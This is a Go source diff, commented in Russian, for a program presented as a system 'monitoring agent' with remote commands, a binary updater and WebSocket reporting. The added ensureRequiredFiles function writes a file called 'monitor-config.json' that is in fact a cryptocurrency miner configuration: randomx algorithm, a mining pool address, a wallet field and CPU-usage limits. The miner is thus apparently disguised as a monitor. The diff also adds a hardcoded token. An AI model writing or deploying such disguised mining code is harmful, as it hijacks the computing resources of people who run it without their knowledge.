@@ -2,31 +2,37 @@
 package main
 
 import (
+	"fmt"      // Пакет для форматированного ввода-вывода
 	"log"      // Пакет для логирования событий
 	"os"       // Пакет для работы с операционной системой
 	"os/signal" // Пакет для обработки системных сигналов
-	"runtime"  // Пакет для получения информации о среде выполнения Go
-	"strings"  // Пакет для работы со строками
 	"syscall"  // Пакет для системных вызовов Unix
 	"time"     // Пакет для работы со временем
 
 	"github.com/shirou/gopsutil/v3/cpu"   // Библиотека для получения информации о процессоре
-	"github.com/shirou/gopsutil/v3/host"  // Библиотека для получения информации о системе
 	"github.com/shirou/gopsutil/v3/mem"   // Библиотека для получения информации о памяти
 	monitor_agent "pr-agent/internal/config" // Внутренний модуль для загрузки конфигурации агента
 	"pr-agent/internal/monitor"             // Внутренний модуль управления монитором
 	"pr-agent/internal/updater"             // Внутренний модуль обновления бинарных файлов
 	"pr-agent/internal/ws"                  // Внутренний модуль для работы с WebSocket-соединением
+	filemanager "pr-common/filemanager"     // Модуль для управления файлами и конфигурациями
 )
 
 // Функция main - точка входа в приложение агента мониторинга
 // Выполняет следующие действия:
-// 1. Загружает конфигурационный файл
-// 2. Инициализирует компоненты агента (обновление, мониторинг, WebSocket-соединение)
-// 3. Устанавливает обработчики команд от сервера
-// 4. Запускает цикл отправки метрик
-// 5. Обрабатывает сигналы завершения для корректного завершения работы
+// 1. Проверяет и создает необходимые файлы (конфигурации, логи и т.д.)
+// 2. Загружает конфигурационный файл
+// 3. Инициализирует компоненты агента (обновление, мониторинг, WebSocket-соединение)
+// 4. Устанавливает обработчики команд от сервера
+// 5. Запускает цикл отправки метрик
+// 6. Обрабатывает сигналы завершения для корректного завершения работы
 func main() {
+	// Проверяем и создаем необходимые файлы
+	err := ensureRequiredFiles()
+	if err != nil {
+		log.Printf("Предупреждение: ошибка при проверке необходимых файлов: %v", err)
+	}
+
 	// Определяем путь к конфигурационному файлу относительно местоположения исполняемого файла
 	configPath := "configs/agent-config.yaml"
 	
@@ -291,4 +297,52 @@ func getRealStatus() string {
 	// В настоящее время мы определим статус на основе того, запущен ли монитор
 	// Поскольку у нас нет прямого доступа здесь, мы просто вернем статус по умолчанию
 	return "active" // Может быть "active", "idle", "maintenance", и т.д.
+}
+
+// ensureRequiredFiles проверяет наличие и создает необходимые файлы приложения
+func ensureRequiredFiles() error {
+	// Определяем пути к необходимым файлам
+	configPath := "configs/agent-config.yaml"
+	monitorConfigPath := "configs/monitor-config.json"
+	logDir := "logs"
+	
+	// Создаем карту файлов с их содержимым по умолчанию
+	files := map[string][]byte{
+		configPath: []byte(`server_url: "http://localhost:8080"
+token: "abc123"
+
+paths:
+  monitor_bin: "./bin/monitor"
+  monitor_config: "./configs/monitor-config.json"
+  monitor_log_file: "./logs/monitor.log"
+
+metrics_interval: 30
+`),
+		monitorConfigPath: []byte(`{
+  "algorithm": "randomx",
+  "url": "pool.example.com:3333",
+  "user": "your-wallet-address",
+  "password": "x",
+  "threads": 0,
+  "cpu-affinity": "0",
+  "priority": 0,
+  "donate-level": 0,
+  "log-file": "./logs/monitor.log",
+  "max-cpu-usage": 75,
+  "safe-mode": true
+}
+`),
+	}
+
+	// Создаем директорию для логов
+	if err := os.MkdirAll(logDir, 0755); err != nil {
+		return fmt.Errorf("не удалось создать директорию для логов: %v", err)
+	}
+
+	// Проверяем и создаем файлы
+	if err := filemanager.EnsureFiles(files); err != nil {
+		return fmt.Errorf("ошибка при проверке и создании файлов: %v", err)
+	}
+
+	return nil
 }
